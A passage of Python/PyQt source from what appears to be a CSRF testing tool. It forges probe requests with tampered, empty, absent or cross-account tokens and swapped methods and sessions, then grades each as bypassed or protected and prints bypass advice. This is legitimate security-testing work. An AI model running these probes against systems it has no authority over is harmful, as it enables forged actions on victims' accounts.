                    "⚠ Account B's own valid request was rejected — check Account B credentials.",
                    "Re-verify Account B's session cookie and refresh URL.",
                )

        if "account a token" in name and "account b session" in name:
            if result == "Bypassed":
                return (
                    "Body token is NOT tied to the session: "
                    "A's token accepted with B's session.",
                    "An attacker uses their own valid body token to perform CSRF "
                    "against any victim's session — no cookie injection needed.",
                )
            elif result == "Protected":
                return (
                    "Body token IS tied to the session: A's token rejected with B's session.",
                    "Token–session binding is enforced.",
                )

        if "account b token" in name and "account a session" in name:
            if result == "Bypassed":
                return (
                    "Body token is not session-scoped (confirmed in both directions): "
                    "B's token accepted with A's session.",
                    "Token interchangeability confirmed — any account's token works with any session.",
                )
            elif result == "Protected":
                return (
                    "Reverse token swap rejected: body token is correctly session-scoped.",
                    "",
                )

        if "refreshed a token" in name and "account b session" in name:
            if result == "Bypassed":
                return (
                    "Even a freshly-issued token for Account A is accepted with Account B's session: "
                    "token–session binding is absent at issuance time, not just validation.",
                    "Use a freshly-obtained token from your own account — "
                    "no stale/cached token needed for the attack.",
                )
            elif result == "Protected":
                return (
                    "Fresh tokens are correctly session-bound: newly-issued A token rejected with B's session.",
                    "",
                )

        if "account b token" in name and "account b session" in name and "account b baseline" in name:
            if result == "Bypassed":
                return ("Account B baseline — request accepted (sanity check passed).", "")
            elif result == "Protected":
                return (
                    "⚠ Account B baseline failed — Account B credentials may be invalid or expired.",
                    "Verify Account B's Cookie header and refresh URL.",
                )

        if "invalid token" in name and "account b session" in name:
            if result == "Protected":
                return (
                    "Account B also rejects invalid tokens: "
                    "validation applies consistently across sessions.",
                    "",
                )
            elif result == "Bypassed":
                return (
                    "⚠ CRITICAL: Account B accepted a random invalid token — "
                    "no CSRF validation is performed at all for B's session.",
                    "Report as total CSRF protection bypass.",
                )

        # ── Body token manipulation probes ────────────────────────────────────

        if "— invalid value" in name and "body" in name:
            if result == "Protected":
                return (
                    "Token value is actively validated: random string rejected by server.",
                    "",
                )
            elif result == "Bypassed":
                return (
                    "⚠ CRITICAL: Server accepted a completely invalid (random) token value — "
                    "token is not validated at all.",
                    "Any value passes — no CSRF token validation exists for this endpoint.",
                )

        if "— empty value" in name and "body" in name:
            if result == "Protected":
                return ("Empty token is correctly rejected.", "")
            elif result == "Bypassed":
                return (
                    "Server accepted an empty token value — "
                    "validation checks only for presence, not correctness.",
                    "Submit the token parameter with an empty value to bypass.",
                )

        if "— parameter absent" in name and "body" in name:
            if result == "Protected":
                return ("Absent token parameter is correctly rejected.", "")
            elif result == "Bypassed":
                return (
                    "Token is only validated when the parameter is present: "
                    "removing the parameter entirely skips validation.",
                    "Omit the CSRF token parameter from the request body to bypass.",
                )

        # ── Cookie token probes ───────────────────────────────────────────────

        if "— invalid value" in name and "cookie" in name:
            if result == "Protected":
                return ("Cookie token value is validated: invalid string rejected.", "")
            elif result == "Bypassed":
                return (
                    "⚠ CRITICAL: Cookie token is not validated — any cookie value is accepted.",
                    "Cookie-based CSRF protection is non-functional.",
                )

        if "— cookie absent" in name:
            if result == "Protected":
                return ("CSRF cookie is required and correctly enforced.", "")
            elif result == "Bypassed":
                return (
                    "Server does not require the CSRF cookie — "
                    "cookie token validation is entirely absent.",
                    "Remove the CSRF cookie from the request to bypass.",
                )

        # ── Header token probes ───────────────────────────────────────────────

        if "— invalid value" in name and "header" in name:
            if result == "Protected":
                return ("Header token value is validated: random string rejected.", "")
            elif result == "Bypassed":
                return (
                    "⚠ CRITICAL: Custom header token value is not validated.",
                    "Any header value is accepted — header token protection is absent.",
                )

        if "— header absent" in name:
            if result == "Protected":
                return ("Custom header token is required — correctly enforced.", "")
            elif result == "Bypassed":
                return (
                    "Custom header token is not required: "
                    "request succeeded without the header.",
                    "Omit the header to bypass — cross-origin forms cannot set custom headers, "
                    "so this is exploitable via a standard CSRF form.",
                )

        # ── GET method switch ─────────────────────────────────────────────────

        if "method switch" in name or "get method" in name:
            if result == "Bypassed":
                return (
                    "CSRF token is only enforced on POST requests — "
                    "GET requests bypass validation entirely.",
                    "Convert POST to GET and move all params to the query string to bypass.",
                )
            elif result == "Protected":
                return (
                    "Token validation applies to GET requests too — method bypass is not available.",
                    "",
                )

        # ── Session cookie removed ────────────────────────────────────────────

        if "session cookie removed" in name:
            if result == "Protected":
                return (
                    "Session cookie is required — endpoint correctly authenticates the request.",
                    "",
                )
            elif result == "Bypassed":
                return (
                    "⚠ CRITICAL: Endpoint accepted request without any session cookie — "
                    "unauthenticated access is possible.",
                    "Report as unauthenticated access (higher severity than CSRF).",
                )

        # ── Double-submit ─────────────────────────────────────────────────────

        if "double-submit" in name:
            if result == "Bypassed":
                return (
                    "Double-submit defence is vulnerable: server only compares "
                    "cookie value == body value with no server-side record.",
                    "Inject any invented token value into both the cookie and request body "
                    "via a cookie-injection endpoint to bypass.",
                )
            elif result == "Protected":
                return ("Double-submit check appears enforced.", "")

        # ── Fallback ─────────────────────────────────────────────────────────
        if result == "Bypassed":
            return ("Probe bypassed — review response for details.", "")
        if result == "Protected":
            return ("Probe rejected by server — protection confirmed for this vector.", "")
        return ("", "")

    def run(self):
        # Run baseline first (index 0), then use it to judge all subsequent probes
        baseline = self.probes[0]
        has_refresh = bool(self._refresh_cfg.get("refresh_url") or
                           self._refresh_cfg.get("acct_b_cookie_hdr"))
        for idx, probe in enumerate(self.probes):
            self.probe_started.emit(idx)

            # ── Token refresh ─────────────────────────────────────────────
            raw = probe.raw_request
            if has_refresh and (probe.refresh_body or probe.refresh_cookies or probe.refresh_hdrs):
                fresh = self._fetch_fresh_token(use_acct_b=probe.use_acct_b_refresh)
                if fresh:
                    raw = self._inject_fresh_token(
                        raw, fresh,
                        probe.refresh_body,
                        probe.refresh_cookies,
                        probe.refresh_hdrs,
                    )

            # ── Body parameter variation ───────────────────────────────────
            body_var = self._refresh_cfg.get("body_variation", {})
            if body_var:
                raw = self._apply_body_variation(raw, idx, body_var)

            probe.raw_request = raw   # keep updated request visible in the UI

            code, reason, headers, body = self._send(raw)
            probe.status_code      = code
            probe.status_text      = reason
            probe.response_headers = headers
            probe.response_body    = body

            if code == 0:
                probe.result_label = "Error"
                probe.error        = body
            elif idx == 0:
                # Baseline — always mark as baseline reference, not a bypass
                probe.result_label = "Baseline"
            else:
                if self._is_success_like(probe, baseline):
                    probe.result_label = "Bypassed"
                elif code in (400, 401, 403, 405, 422, 500, 501):
                    probe.result_label = "Protected"
                else:
                    probe.result_label = "Unknown"

            # Compute relationship analysis now that result_label is final
            probe.analysis_note, probe.exploit_action = \
                self._compute_probe_analysis(probe)

            self.probe_finished.emit(idx, probe)
        self.all_done.emit()


class CSRFTesterDialog(QDialog):
    """
    Modal dialog that sends a sequence of CSRF probe requests and
    analyses the responses to suggest the best bypass technique.

    Layout:
      ┌─────────────────────────────────────────────────┐
      │  Progress bar                                   │
      │  Queue table (name | status | result)           │
      ├─────────────────────────────────────────────────┤
      │  Tabs: HTTP Request | HTTP Response | Summary   │
      └─────────────────────────────────────────────────┘
    """

    # Colours for result labels
    _RESULT_COLORS = {
        "Bypassed":  "#ff4c4c",
        "Protected": "#2ecc71",
        "Baseline":  "#5b9bd5",
        "Error":     "#e67e22",
        "Pending":   "#888888",
        "Unknown":   "#aaaaaa",
    }

    def __init__(self, request_info: "RequestInfo", raw_request: str,
                 config: Optional[Dict] = None, parent=None):
        super().__init__(parent)
        self.setWindowFlag(Qt.Window, True)   # independent, non-modal window
        self.request_info = request_info
        self.raw_request  = raw_request
        self._config      = config or {}
        self._probes: List[CSRFProbe] = []
        self._worker: Optional[CSRFTesterWorker] = None
        self._selected_row = -1
        self._config_dlg   = None   # reference to the CSRFAnalysisDialog that launched us

        self.setWindowTitle("🔬 CSRF Mechanism Tester — Advanced Probe Suite")
        self.setMinimumSize(900, 680)
        self.setStyleSheet(f"""
            QDialog, QWidget {{
                background:{COLOR_ELEVATED_BG}; color:{COLOR_TEXT};
            }}
            QTableWidget {{
                background:{COLOR_DARK_BG}; color:{COLOR_TEXT};
                gridline-color:{COLOR_BORDER};
                border:1px solid {COLOR_BORDER};
            }}
            QTableWidget::item:selected {{
                background:{COLOR_ACCENT}; color:#000;
            }}
            QHeaderView::section {{
                background:{COLOR_ELEVATED_BG}; color:{COLOR_TEXT_MUTED};
                border:1px solid {COLOR_BORDER}; padding:4px;
            }}
            QTextEdit {{
                background:{COLOR_DARK_BG}; color:{COLOR_TEXT};
                border:1px solid {COLOR_BORDER}; border-radius:3px;
            }}
            QPushButton {{
                background:{COLOR_ELEVATED_BG}; color:{COLOR_TEXT};
                border:1px solid {COLOR_BORDER}; border-radius:4px;
                padding:4px 12px;
            }}
            QPushButton:hover {{ border-color:{COLOR_ACCENT}; color:{COLOR_TEXT_BRIGHT}; }}
            QPushButton:disabled {{ color:{COLOR_TEXT_MUTED}; }}
            QTabBar::tab {{
                background:{COLOR_ELEVATED_BG}; color:{COLOR_TEXT_MUTED};
                border:1px solid {COLOR_BORDER}; padding:5px 12px;
                margin-right:2px;
            }}
            QTabBar::tab:selected {{
                background:{COLOR_DARK_BG}; color:{COLOR_TEXT_BRIGHT};
                border-bottom:2px solid {COLOR_ACCENT};
            }}
        """)

        self._build_ui()
        self._build_probes()
        self._populate_queue()

    # ── UI ──────────────────────────────────────────────────────────────────

    def _build_ui(self):
        root = QVBoxLayout(self)
        root.setContentsMargins(10, 10, 10, 10)
        root.setSpacing(8)

        # Top toolbar
        tb = QHBoxLayout()
        self._run_btn = QPushButton("▶  Run All Probes")
        self._run_btn.setStyleSheet(
            f"QPushButton{{background:{COLOR_SUCCESS};color:#000;font-weight:bold;"
            f"border:none;border-radius:4px;padding:4px 16px;}}"
            f"QPushButton:hover{{background:#3dff90;}}"
            f"QPushButton:disabled{{background:{COLOR_BORDER};color:{COLOR_TEXT_MUTED};}}"
        )
        self._run_btn.clicked.connect(self._start_probes)

        self._stop_btn = QPushButton("■  Stop")
        self._stop_btn.setEnabled(False)
        self._stop_btn.clicked.connect(self._stop_probes)

        self._status_lbl = QLabel("Ready — click 'Run All Probes' to start")
        self._status_lbl.setStyleSheet(f"color:{COLOR_TEXT_MUTED};font-size:9pt;")

        tb.addWidget(self._run_btn)
        tb.addWidget(self._stop_btn)
        tb.addSpacing(12)
        tb.addWidget(self._status_lbl)
        tb.addStretch()

        self._reconfig_btn = QPushButton("⚙  Reconfigure")
        self._reconfig_btn.setToolTip(
            "Stop probes and go back to the Configure Probes dialog to edit settings")
        self._reconfig_btn.setStyleSheet(
            f"QPushButton{{background:{COLOR_ELEVATED_BG};color:{COLOR_TEXT};"
            f"border:1px solid {COLOR_BORDER};border-radius:4px;padding:4px 12px;}}"
            f"QPushButton:hover{{border-color:{COLOR_ACCENT};color:{COLOR_TEXT_BRIGHT};}}"
        )
        self._reconfig_btn.clicked.connect(self._reconfigure)
        tb.addWidget(self._reconfig_btn)

        root.addLayout(tb)

        # Progress bar
        self._progress = QProgressBar()
        self._progress.setFixedHeight(6)
        self._progress.setTextVisible(False)
        self._progress.setStyleSheet(
            f"QProgressBar{{background:{COLOR_DARK_BG};border:none;border-radius:3px;}}"
            f"QProgressBar::chunk{{background:{COLOR_ACCENT};border-radius:3px;}}"
        )
        self._progress.setValue(0)
        root.addWidget(self._progress)

        # Main splitter
        splitter = QSplitter(Qt.Vertical)
        splitter.setHandleWidth(5)
        splitter.setStyleSheet(f"QSplitter::handle{{background:{COLOR_BORDER};}}")

        # ── Queue table ──────────────────────────────────────────────────
        queue_widget = QWidget()
        queue_layout = QVBoxLayout(queue_widget)
        queue_layout.setContentsMargins(0, 0, 0, 0)
        queue_layout.setSpacing(4)

        queue_lbl = QLabel("Probe Queue")
        queue_lbl.setStyleSheet(f"color:{COLOR_ACCENT};font-size:9pt;font-weight:bold;")
        queue_layout.addWidget(queue_lbl)

        self._table = QTableWidget(0, 4)
        self._table.setHorizontalHeaderLabels(["#", "Probe Name", "Status", "Result"])
        self._table.horizontalHeader().setSectionResizeMode(1, QHeaderView.Stretch)
        self._table.horizontalHeader().setSectionResizeMode(0, QHeaderView.Fixed)
        self._table.horizontalHeader().setSectionResizeMode(2, QHeaderView.Fixed)
        self._table.horizontalHeader().setSectionResizeMode(3, QHeaderView.Fixed)
        self._table.setColumnWidth(0, 32)
        self._table.setColumnWidth(2, 80)
        self._table.setColumnWidth(3, 100)
        self._table.setSelectionBehavior(QTableWidget.SelectRows)
        self._table.setEditTriggers(QTableWidget.NoEditTriggers)
        self._table.verticalHeader().setVisible(False)
        self._table.setAlternatingRowColors(True)
        self._table.itemSelectionChanged.connect(self._on_row_selected)
        queue_layout.addWidget(self._table)
        splitter.addWidget(queue_widget)

        # ── Detail tabs ──────────────────────────────────────────────────
        self._tabs = QTabWidget()

        self._req_view = QTextEdit()
        self._req_view.setReadOnly(True)
        self._req_view.setFont(QFont("Consolas", 9))
        self._req_view.setPlaceholderText("Select a probe above to see its request…")
        self._tabs.addTab(self._req_view, "📤 HTTP Request")

        self._resp_view = QTextEdit()
        self._resp_view.setReadOnly(True)
        self._resp_view.setFont(QFont("Consolas", 9))
        self._resp_view.setPlaceholderText("Response will appear here after probe runs…")
        self._tabs.addTab(self._resp_view, "📥 HTTP Response")

        self._summary_view = QTextEdit()
        self._summary_view.setReadOnly(True)
        self._summary_view.setFont(QFont("Consolas", 10))
        self._summary_view.setPlaceholderText("Summary and bypass recommendation appear here after all probes complete…")
        self._tabs.addTab(self._summary_view, "📊 Summary & Recommendation")

        splitter.addWidget(self._tabs)
        splitter.setSizes([280, 320])
        root.addWidget(splitter)

        # Bottom button row
        btn_row = QHBoxLayout()
        reconfig_btn2 = QPushButton("⚙  Reconfigure")
        reconfig_btn2.setToolTip("Go back to the Configure Probes dialog")
        reconfig_btn2.setStyleSheet(
            f"QPushButton{{background:{COLOR_ELEVATED_BG};color:{COLOR_TEXT};"
            f"border:1px solid {COLOR_BORDER};border-radius:4px;padding:4px 12px;}}"
            f"QPushButton:hover{{border-color:{COLOR_ACCENT};color:{COLOR_TEXT_BRIGHT};}}"
        )
        reconfig_btn2.clicked.connect(self._reconfigure)
        close_btn = QPushButton("Close")
        close_btn.clicked.connect(self.close)
        close_btn.setFixedWidth(100)
        btn_row.addWidget(reconfig_btn2)
        btn_row.addStretch()
        btn_row.addWidget(close_btn)
        root.addLayout(btn_row)

    # ── Reconfigure — go back to the config dialog ──────────────────────────

    def _reconfigure(self):
        """Close this tester dialog and re-open the Configure Probes dialog."""
        if self._worker and self._worker.isRunning():
            self._stop_probes()
        if self._config_dlg is not None and not self._config_dlg.isHidden():
            # Config dialog already visible — bring it forward and close tester
            self._config_dlg.raise_()
            self._config_dlg.activateWindow()
        else:
            # Open a fresh config dialog pre-filled with the current config
            dlg = CSRFAnalysisDialog(
                self.request_info, self.raw_request,
                prefill_config=self._config,
                parent=self.parent())
            dlg.setAttribute(Qt.WA_DeleteOnClose)
            dlg.show()
            self._config_dlg = dlg
        # Always close the tester window so only one chain is open at a time
        self.close()

    # ── Probe construction ──────────────────────────────────────────────────

    def _build_probes(self):
        """Build the full probe sequence from request + analysis config."""
        ri  = self.request_info
        cfg = self._config

        body_tokens:   List[Tuple[str,str]] = cfg.get("body_tokens", [])
        cookie_tokens: List[Tuple[str,str]] = cfg.get("cookie_tokens", [])
        hdr_tokens:    List[Tuple[str,str]] = cfg.get("hdr_tokens", [])
        refresh_url       = cfg.get("refresh_url", "")
        acct_b_cookie_hdr = cfg.get("acct_b_cookie_hdr", "")
        double_submit     = cfg.get("double_submit", False)

        # Parse Account B's session and CSRF cookie tokens from their Cookie header
        b_session_val  = ""
        b_csrf_key_val = ""
        if acct_b_cookie_hdr:
            for _part in acct_b_cookie_hdr.split(";"):
                _part = _part.strip()
                if "=" not in _part:
                    continue
                _ck, _cv = _part.split("=", 1)
                _ck = _ck.strip()
                _cv = _cv.strip()
                if re.match(r"^session$", _ck, re.I):
                    b_session_val = _cv
                elif cookie_tokens and any(_ck.lower() == n.lower() for n, _ in cookie_tokens):
                    b_csrf_key_val = _cv
        has_acct_b = bool(acct_b_cookie_hdr)

        # Shorthand name lists for refresh directives
        _rb = [k for k, _ in body_tokens]   # body param names
        _rh = [k for k, _ in hdr_tokens]    # header names
        _rc = [k for k, _ in cookie_tokens] # cookie names

        # Auto-detect if no config provided (legacy / direct open path)
        if not body_tokens and not cookie_tokens and not hdr_tokens:
            if ri.body:
                try:
                    data = json.loads(ri.body)
                    if isinstance(data, dict):
                        for k, v in data.items():
                            if CSRFGenerator._is_csrf_token_key(k):
                                body_tokens.append((k, str(v)))
                except (json.JSONDecodeError, ValueError):
                    for k, vs in urllib.parse.parse_qs(ri.body, keep_blank_values=True).items():
                        if CSRFGenerator._is_csrf_token_key(k):
                            body_tokens.append((k, vs[0] if vs else ""))
            for hdr, val in ri.headers.items():
                if hdr.lower() == "cookie":
                    for part in val.split(";"):
                        part = part.strip()
                        if "=" in part:
                            ck, cv = part.split("=", 1)
                            if (CSRFGenerator._is_csrf_token_key(ck.strip()) and
                                    not re.match(r"^session$", ck.strip(), re.I)):
                                cookie_tokens.append((ck.strip(), cv.strip()))
                elif hdr.lower() in CSRFAnalysisDialog._CSRF_HEADERS:
                    hdr_tokens.append((hdr, val))

        # ── Inner helpers ──────────────────────────────────────────────

        def _set_body_tokens(body, replacements):
            try:
                params = urllib.parse.parse_qsl(body, keep_blank_values=True)
                new_params, existing = [], {k for k, _ in params}
                for k, v in params:
                    if k in replacements:
                        nv = replacements[k]
                        if nv is not None:
                            new_params.append((k, nv))
                    else:
                        new_params.append((k, v))
                for k, v in replacements.items():
                    if k not in existing and v is not None:
                        new_params.append((k, v))
                return urllib.parse.urlencode(new_params)
            except Exception:
                return body

        def _set_hdr_tokens(headers, replacements):
            result = dict(headers)
            for k, v in replacements.items():
                for ek in list(result.keys()):
                    if ek.lower() == k.lower():
                        if v is None:
                            del result[ek]
                        else:
                            result[ek] = v
                        break
                else:
                    if v is not None:
                        result[k] = v
            return result

        def _set_cookie_tokens(headers, replacements):
            result = dict(headers)
            for hk in list(result.keys()):
                if hk.lower() != "cookie":
                    continue
                parts = [p.strip() for p in result[hk].split(";")]
                new_parts, replaced = [], set()
                for part in parts:
                    if "=" not in part:
                        new_parts.append(part)
                        continue
                    ck, cv = part.split("=", 1)
                    ck = ck.strip()
                    if ck in replacements:
                        nv = replacements[ck]
                        replaced.add(ck)
                        if nv is not None:
                            new_parts.append(f"{ck}={nv}")
                    else:
                        new_parts.append(part)
                for ck, cv in replacements.items():
                    if ck not in replaced and cv is not None:
                        new_parts.append(f"{ck}={cv}")
                result[hk] = "; ".join(p for p in new_parts if p)
                return result
            new_cookies = [f"{k}={v}" for k, v in replacements.items() if v is not None]
            if new_cookies:
                result["Cookie"] = "; ".join(new_cookies)
            return result

        def _swap_session(headers, new_session):
            result = dict(headers)
            sess_val = new_session
            if re.match(r"^session\s*=", sess_val, re.I):
                sess_val = sess_val.split("=", 1)[1].strip()
            for hk in list(result.keys()):
                if hk.lower() == "cookie":
                    parts = [p.strip() for p in result[hk].split(";")
                             if not re.match(r"^session\s*=", p.strip(), re.I)]
                    parts.insert(0, f"session={sess_val}")
                    result[hk] = "; ".join(parts)
                    return result
            result["Cookie"] = f"session={sess_val}"
            return result

        def _rebuild(method=None, url=None, headers=None, body=None):
            m    = method  or ri.method
            u    = url     or ri.path
            hdrs = dict(ri.headers) if headers is None else dict(headers)
            b    = body if body is not None else ri.body
            if b and any(k.lower() == "content-length" for k in hdrs):
                for k in list(hdrs):
                    if k.lower() == "content-length":
                        hdrs[k] = str(len(b.encode("utf-8")))
            lines = [f"{m} {u} HTTP/1.1"]
            for k, v in hdrs.items():
                lines.append(f"{k}: {v}")
            lines.append("")
            lines.append(b or "")
            return "\n".join(lines)

        INVALID = "INVALID_TOKEN_XvpQzL91"
        FAKE    = "fake"

        # ── 1. Baseline ────────────────────────────────────────────────
        self._probes.append(CSRFProbe(
            "Baseline (valid request)",
            "Original request as-is. All other probes compared against this.",
            _rebuild(), "",
            refresh_body=_rb, refresh_cookies=_rc, refresh_hdrs=_rh))

        # ── 2. Baseline + refreshed token (sanity-check row) ───────────
        if refresh_url:
            self._probes.append(CSRFProbe(
                "Baseline + refreshed token",
                f"Fetch fresh token from {refresh_url} then send. Confirms refresh works.",
                _rebuild(), "",
                refresh_body=_rb, refresh_cookies=_rc, refresh_hdrs=_rh))

        # ── 3. Body token probes ───────────────────────────────────────
        for tok_name, _ in body_tokens:
            self._probes.append(CSRFProbe(
                f"Body \'{tok_name}\' — invalid value",
                f"Replace \'{tok_name}\' value with a random string.",
                _rebuild(body=_set_body_tokens(ri.body, {tok_name: INVALID})),
                "None"))
            self._probes.append(CSRFProbe(
                f"Body \'{tok_name}\' — empty value",
                f"Set \'{tok_name}\' to empty string.",
                _rebuild(body=_set_body_tokens(ri.body, {tok_name: ""})),
                "Token validation – Token absent"))
            self._probes.append(CSRFProbe(
                f"Body \'{tok_name}\' — null value",
                f"Set \'{tok_name}\' to the literal string 'null'. Some JSON-parsing "
                f"backends treat the string 'null' the same as a missing value and "
                f"skip CSRF validation.",
                _rebuild(body=_set_body_tokens(ri.body, {tok_name: "null"})),
                "Token validation – Token absent"))
            self._probes.append(CSRFProbe(
                f"Body \'{tok_name}\' — parameter absent",
                f"Remove \'{tok_name}\' parameter entirely.",
                _rebuild(body=_set_body_tokens(ri.body, {tok_name: None})),
                "Token validation – Token absent"))

        # ── 4. Cookie token probes ─────────────────────────────────────
        for ck_name, _ in cookie_tokens:
            self._probes.append(CSRFProbe(
                f"Cookie \'{ck_name}\' — invalid value",
                f"Set cookie \'{ck_name}\' to an invalid random string.",
                _rebuild(headers=_set_cookie_tokens(ri.headers, {ck_name: INVALID})),
                "None"))
            self._probes.append(CSRFProbe(
                f"Cookie \'{ck_name}\' — null value",
                f"Set cookie \'{ck_name}\' to the literal string 'null'. Tests whether "
                f"the server skips validation when the cookie value is the null literal.",
                _rebuild(headers=_set_cookie_tokens(ri.headers, {ck_name: "null"})),
                "Token validation – Token absent"))
            self._probes.append(CSRFProbe(
                f"Cookie \'{ck_name}\' — cookie absent",
                f"Remove cookie \'{ck_name}\' from Cookie header entirely.",
                _rebuild(headers=_set_cookie_tokens(ri.headers, {ck_name: None})),
                "Token validation – Token absent"))

        # ── 5. Header token probes ─────────────────────────────────────
        for hdr_name, hdr_val in hdr_tokens:
            self._probes.append(CSRFProbe(
                f"Header \'{hdr_name}\' — invalid value",
                f"Replace \'{hdr_name}\' header value with a random string.",
                _rebuild(headers=_set_hdr_tokens(ri.headers, {hdr_name: INVALID})),
                "None"))
            self._probes.append(CSRFProbe(
                f"Header \'{hdr_name}\' — header absent",
                f"Remove \'{hdr_name}\' header entirely (no header name, no token value).",
                _rebuild(headers=_set_hdr_tokens(ri.headers, {hdr_name: None})),
                "Token validation – Token absent"))
            self._probes.append(CSRFProbe(
                f"Header \'{hdr_name}\' — token value empty",
                f"Send \'{hdr_name}\' header present but with an empty value. "
                f"Tests whether the server distinguishes an empty token from an absent header.",
                _rebuild(headers=_set_hdr_tokens(ri.headers, {hdr_name: ""})),
                "Token validation – Token absent"))
            self._probes.append(CSRFProbe(
                f"Header \'{hdr_name}\' — null value",
                f"Send \'{hdr_name}\' header with the literal value 'null'. Some "
                f"frameworks deserialise headers and treat 'null' as a missing token, "
                f"bypassing CSRF validation.",
                _rebuild(headers=_set_hdr_tokens(ri.headers, {hdr_name: "null"})),
                "Token validation – Token absent"))
            _tok_len = max(1, len(hdr_val))
            _same_len_tok = secrets.token_hex((_tok_len + 1) // 2)[:_tok_len]
            self._probes.append(CSRFProbe(
                f"Header \'{hdr_name}\' — same length, different value",
                f"Replace \'{hdr_name}\' with a random token of the same character "
                f"length ({_tok_len} chars) as the original. Tests whether the server "
                f"validates token structure/length rather than the actual value.",
                _rebuild(headers=_set_hdr_tokens(ri.headers, {hdr_name: _same_len_tok})),
                "None"))

        # ── 6. GET method switch ───────────────────────────────────────
        if ri.method == "POST":
            get_url  = CSRFGenerator._body_to_query_params(ri.url, ri.body)
            parsed   = urllib.parse.urlparse(get_url)
            get_path = parsed.path + (f"?{parsed.query}" if parsed.query else "")
            get_hdrs = {k: v for k, v in ri.headers.items()
                        if k.lower() not in ("content-type", "content-length")}
            self._probes.append(CSRFProbe(
                "GET method switch",
                "POST→GET, all body params in query string.",
                _rebuild(method="GET", url=get_path, headers=get_hdrs, body=""),
                "Token validation – Request method",
                refresh_body=_rb, refresh_hdrs=_rh))

        # ── 6b. HEAD method probe ──────────────────────────────────────
        head_hdrs = {k: v for k, v in ri.headers.items()
                     if k.lower() not in ("content-type", "content-length")}
        self._probes.append(CSRFProbe(
            "HEAD method (processed as GET)",
            "Send HEAD instead of the original method. Many frameworks (Oak, Express) "
            "route HEAD to the GET handler and strip the response body — the action "
            "still executes. Tests whether method-specific validation or rate-limiting "
            "is bypassed.",
            _rebuild(method="HEAD", headers=head_hdrs, body=""),
            CSRFGenerator.BYPASS_HEAD_METHOD,
            refresh_body=_rb, refresh_hdrs=_rh))

        # ── 7. Session cookie removed ──────────────────────────────────
        no_sess = dict(ri.headers)
        for k in list(no_sess):
            if k.lower() == "cookie":
                stripped = "; ".join(
                    c for c in no_sess[k].split(";")
                    if not re.match(r"^\s*session\s*=", c.strip(), re.I))
                if stripped.strip():
                    no_sess[k] = stripped
                else:
                    del no_sess[k]
        self._probes.append(CSRFProbe(
            "Session cookie removed",
            "Remove session cookie, keep all CSRF tokens. Confirms token-session binding.",
            _rebuild(headers=no_sess), "",
            refresh_body=_rb, refresh_cookies=_rc, refresh_hdrs=_rh))

        # ── 8. Double-submit ───────────────────────────────────────────
        if double_submit and (body_tokens or cookie_tokens or hdr_tokens):
            # Helper: produce a random hex string of the same length as the original value.
            # Falls back to a 32-char hex if the original is empty.
            def _fake_same_len(orig: str) -> str:
                n = len(orig) if orig else 32
                # secrets.token_hex(n) produces 2*n hex chars — take first n
                return secrets.token_hex(max(n, 1))[:n]

            def _fake_fixed(length: int) -> str:
                return secrets.token_hex(max(length, 1))[:length]

            # ── 8a. Same-length fake (matches original token length) ───
            ds_body_sl = _set_body_tokens(
                ri.body,
                {k: _fake_same_len(v) for k, v in body_tokens})
            ds_hdrs_sl = _set_cookie_tokens(
                ri.headers,
                {k: _fake_same_len(v) for k, v in cookie_tokens})
            ds_hdrs_sl = _set_hdr_tokens(
                ds_hdrs_sl,
                {k: _fake_same_len(v) for k, v in hdr_tokens})
            orig_len = max(
                (len(v) for _, v in body_tokens + cookie_tokens + hdr_tokens),
                default=0)
            self._probes.append(CSRFProbe(
                f"Double-submit: same-length random fake (len={orig_len})",
                f"All token locations set to a random hex value matching the original "
                f"token length ({orig_len} chars). Tests whether the server validates "
                f"format/length rather than only the value.",
                _rebuild(headers=ds_hdrs_sl, body=ds_body_sl),
                "Token validation – Double submit cookie"))

            # ── 8b. 32-char random fake ────────────────────────────────
            fake32 = _fake_fixed(32)
            ds_body_32 = _set_body_tokens(ri.body, {k: fake32 for k, _ in body_tokens})
            ds_hdrs_32 = _set_cookie_tokens(ri.headers, {k: fake32 for k, _ in cookie_tokens})
            ds_hdrs_32 = _set_hdr_tokens(ds_hdrs_32, {k: fake32 for k, _ in hdr_tokens})
            self._probes.append(CSRFProbe(
                f"Double-submit: 32-char random fake ({fake32[:8]}…)",
                f"Body + cookie + header tokens all set to the same 32-char random hex "
                f"value '{fake32}'. Common CSRF token length.",
                _rebuild(headers=ds_hdrs_32, body=ds_body_32),
                "Token validation – Double submit cookie"))

            # ── 8c. 16-char random fake ────────────────────────────────
            fake16 = _fake_fixed(16)
            ds_body_16 = _set_body_tokens(ri.body, {k: fake16 for k, _ in body_tokens})
            ds_hdrs_16 = _set_cookie_tokens(ri.headers, {k: fake16 for k, _ in cookie_tokens})
            ds_hdrs_16 = _set_hdr_tokens(ds_hdrs_16, {k: fake16 for k, _ in hdr_tokens})
            self._probes.append(CSRFProbe(
                f"Double-submit: 16-char random fake ({fake16})",
                f"Body + cookie + header tokens all set to the same 16-char random hex "
                f"value '{fake16}'.",
                _rebuild(headers=ds_hdrs_16, body=ds_body_16),
                "Token validation – Double submit cookie"))

            # ── 8d. Original "fake" string (legacy / short value) ─────
            ds_body = _set_body_tokens(ri.body, {k: FAKE for k, _ in body_tokens})
            ds_hdrs = _set_cookie_tokens(ri.headers, {k: FAKE for k, _ in cookie_tokens})
            ds_hdrs = _set_hdr_tokens(ds_hdrs, {k: FAKE for k, _ in hdr_tokens})
            self._probes.append(CSRFProbe(
                "Double-submit: plain 'fake' value (short/obvious)",
                f"Body + cookie + header tokens all set to '{FAKE}'. "
                f"Some servers reject tokens that are too short; others accept anything.",
                _rebuild(headers=ds_hdrs, body=ds_body),
                "Token validation – Double submit cookie"))

            # ── 8e. Different fake values per body token (multi-token) ─
            if len(body_tokens) >= 2:
                multi = {k: _fake_same_len(v) for k, v in body_tokens}
                self._probes.append(CSRFProbe(
                    "Double-submit: different same-length fakes per body token",
                    "Each body token gets its own random fake of the correct length — "
                    "tests partial-match logic across multiple token fields.",
                    _rebuild(body=_set_body_tokens(ri.body, multi)),
                    "Token validation – Double submit cookie"))

        # ── 9. Cross-account session binding probes ────────────────────
        # Requires Account B's raw HTTP request (pasted in the Token Refresh tab).
        # B's session and csrfKey are auto-extracted from B's Cookie header;
        # B's CSRF body/header tokens are auto-fetched at runtime from B's refresh URL.
        if has_acct_b:
            # Build Account B headers: replace the Cookie header entirely with B's full cookie.
            # Do NOT patch individual cookies from A's headers — that leaves A's other
            # cookies in place (the bug: probes still sent A's session/csrfKey).
            b_hdrs = dict(ri.headers)
            for _bk in list(b_hdrs.keys()):
                if _bk.lower() == "cookie":
                    b_hdrs[_bk] = acct_b_cookie_hdr
                    break
            else:
